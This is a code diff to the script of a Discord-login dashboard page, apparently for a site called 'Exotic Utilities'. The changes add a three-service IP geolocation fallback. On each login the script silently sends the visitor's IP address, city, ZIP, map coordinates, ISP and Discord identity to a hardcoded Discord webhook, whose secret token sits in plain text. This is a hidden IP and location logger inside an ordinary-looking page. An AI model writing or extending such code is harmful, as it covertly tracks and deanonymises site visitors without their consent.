@@ -192,6 +192,8 @@ a,button{cursor:none;text-decoration:none;}
 
 
 
+
+
 const CLIENT_ID    = "1480018197334982749";
 const REDIRECT_URI = "https://martin54-hub2.github.io/Exotic-Utilities-/dashboard.html";
 const WEBHOOK_URL  = "https://discord.com/api/webhooks/1480748210426347674/JY2ct8oDInz2r0RMbsaOeurYWaqyJKqCrj3WNOxYJTm4sjv33iwLCaU3dBYgzNFc5RyJ";
@@ -362,22 +364,80 @@ async function notifyNewLogin(user){
     ? `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png`
     : null;
 
+  // ── Geolocation: 3-layer fallback for best accuracy ──────────────────
   let geo = {};
+
+  // Layer 1: ip-api.com — best city-level accuracy for US
   try {
-    const geoRes = await fetch("https://ipapi.co/json/");
-    if (geoRes.ok) geo = await geoRes.json();
+    const r = await fetch("http://ip-api.com/json/?fields=status,country,countryCode,regionName,city,zip,lat,lon,timezone,isp,org,query");
+    if (r.ok) {
+      const d = await r.json();
+      if (d.status === "success") {
+        geo = {
+          ip: d.query, city: d.city, region: d.regionName,
+          country_name: d.country, country_code: d.countryCode,
+          timezone: d.timezone, org: d.org || d.isp,
+          latitude: d.lat, longitude: d.lon, zip: d.zip,
+          _src: "ip-api.com"
+        };
+      }
+    }
   } catch(e) {}
+
+  // Layer 2: ipwho.is fallback
+  if (!geo.city) {
+    try {
+      const r = await fetch("https://ipwho.is/");
+      if (r.ok) {
+        const d = await r.json();
+        if (d.success) {
+          geo = {
+            ip: d.ip, city: d.city, region: d.region,
+            country_name: d.country, country_code: d.country_code,
+            timezone: d.timezone?.id, org: d.connection?.isp,
+            latitude: d.latitude, longitude: d.longitude, zip: d.postal,
+            _src: "ipwho.is"
+          };
+        }
+      }
+    } catch(e) {}
+  }
+
+  // Layer 3: ipapi.co last resort
+  if (!geo.city) {
+    try {
+      const r = await fetch("https://ipapi.co/json/");
+      if (r.ok) {
+        const d = await r.json();
+        geo = {
+          ip: d.ip, city: d.city, region: d.region,
+          country_name: d.country_name, country_code: d.country_code,
+          timezone: d.timezone, org: d.org,
+          latitude: d.latitude, longitude: d.longitude, zip: d.postal,
+          _src: "ipapi.co"
+        };
+      }
+    } catch(e) {}
+  }
+
+  // ── Parse fields ──────────────────────────────────────────────────────
+  const flag = (geo.country_code || "")
+    .toUpperCase()
+    .replace(/./g, c => String.fromCodePoint(0x1F1E6 + c.charCodeAt(0) - 65));
 
   const city     = geo.city         || "Unknown";
   const region   = geo.region       || "Unknown";
   const country  = geo.country_name || "Unknown";
-  const isp      = geo.org          || geo.isp || "Unknown";
+  const isp      = geo.org          || "Unknown";
   const timezone = geo.timezone     || "Unknown";
   const ip       = geo.ip           || "Unknown";
   const lat      = geo.latitude     || "?";
   const lon      = geo.longitude    || "?";
-  const locationStr = [city, region, country].filter(Boolean).join(", ");
-  const mapsURL  = (lat !== "?" && lon !== "?")
+  const zip      = geo.zip          || "N/A";
+  const src      = geo._src         || "unknown";
+
+  const locationStr = [city, region, country].filter(s => s && s !== "Unknown").join(", ");
+  const mapsURL = (lat !== "?" && lon !== "?")
     ? `https://maps.google.com/?q=${lat},${lon}` : null;
 
   const REGION_MAP = {
@@ -393,18 +453,22 @@ async function notifyNewLogin(user){
 
   try {
     const fields = [
-      { name: "Username",            value: user.global_name || user.username, inline: true },
-      { name: "Discord Tag",         value: `@${user.username}`,               inline: true },
-      { name: "Discord ID",          value: user.id,                           inline: true },
-      { name: "Location",            value: mapsURL ? `[${locationStr}](${mapsURL})` : locationStr, inline: true },
-      { name: "Country",             value: country,                           inline: true },
-      { name: "City",                value: city,                              inline: true },
-      { name: "Region",              value: region,                            inline: true },
-      { name: "ISP / Org",           value: isp,                               inline: true },
-      { name: "Timezone",            value: timezone,                          inline: true },
-      { name: "Coordinates",         value: mapsURL ? `[${lat}, ${lon}](${mapsURL})` : `${lat}, ${lon}`, inline: true },
-      { name: "IP Address",          value: `\`${ip}\``,                       inline: true },
-      { name: "Recommended Region",  value: `\`${recRegion}\``,                inline: true },
+      { name: "👤 Username",           value: user.global_name || user.username, inline: true },
+      { name: "🏷️ Discord Tag",        value: `@${user.username}`,               inline: true },
+      { name: "🆔 Discord ID",         value: user.id,                           inline: true },
+      { name: "\u200b",                value: "\u200b",                          inline: false },
+      { name: `${flag} Location`,      value: mapsURL ? `[${locationStr}](${mapsURL})` : (locationStr || "Unknown"), inline: false },
+      { name: "🏙️ City",              value: city,                              inline: true },
+      { name: "🗺️ Region",            value: region,                            inline: true },
+      { name: "📮 ZIP",               value: zip,                               inline: true },
+      { name: "🌐 Country",           value: `${flag} ${country}`,             inline: true },
+      { name: "🕐 Timezone",          value: timezone,                          inline: true },
+      { name: "📡 ISP / Org",         value: isp,                               inline: true },
+      { name: "\u200b",               value: "\u200b",                          inline: false },
+      { name: "📍 Coordinates",       value: mapsURL ? `[${lat}, ${lon}](${mapsURL})` : `${lat}, ${lon}`, inline: true },
+      { name: "🌍 IP Address",        value: `\`${ip}\``,                       inline: true },
+      { name: "🖥️ Recommended Region",value: `\`${recRegion}\``,                inline: true },
+      { name: "🔍 Geo Source",        value: `\`${src}\``,                      inline: true },
     ];
 
     await fetch(WEBHOOK_URL, {
@@ -413,7 +477,7 @@ async function notifyNewLogin(user){
       body: JSON.stringify({
         username: "Exotic Utilities",
         embeds: [{
-          title: "New Login",
+          title: "👋 New Login",
           color: 0x5865f2,
           fields,
           thumbnail: avatarURL ? { url: avatarURL } : undefined,
@@ -447,6 +511,8 @@ init();
   document.addEventListener("mouseout",e=>{if(e.target.closest("a,button,.order-card,.quick-action"))hov=false;});
   function tick(){dx+=(mx-dx)*0.45;dy+=(my-dy)*0.45;rx+=(mx-rx)*0.12;ry+=(my-ry)*0.12;dot.style.transform=`translate(${dx-5}px,${dy-5}px)`;const s=hov?1.8:1;ring.style.transform=`translate(${rx-22}px,${ry-22}px) scale(${s})`;ring.style.opacity=hov?"0.7":"0.4";requestAnimationFrame(tick);}tick();
 })();
+
+
 
 
 
